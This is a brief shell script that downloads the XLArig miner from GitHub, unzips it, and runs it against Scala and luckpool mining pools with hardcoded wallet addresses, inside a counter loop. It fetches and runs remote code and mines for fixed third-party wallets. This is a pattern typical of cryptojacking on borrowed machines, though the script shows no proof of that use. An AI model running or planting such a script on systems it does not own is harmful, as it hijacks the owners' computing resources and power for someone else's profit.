#!/bin/sh
 
COUNTER=20
until [  $COUNTER -lt 10 ]; do
 
wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o scala.herominers.com:10131 -u Svm8UwFGThRf1juzf2ZsJhZ9G2vQLWuUUfhxr4HGdbT1PtRhLbQwjSbSqt3KJANwJhL1Q1gTmitkQSqbLSdfkniv2neeX649u -p namaworker -a panthera -k -t8
 
 
./start.sh -v -l na.luckpool.net:3956 -u RWAANxfUjGzHGw9tC7UjA54eziraaPavxW.ancan  -p x -t 2
 
     echo COUNTER $COUNTER
     let COUNTER-=1
done
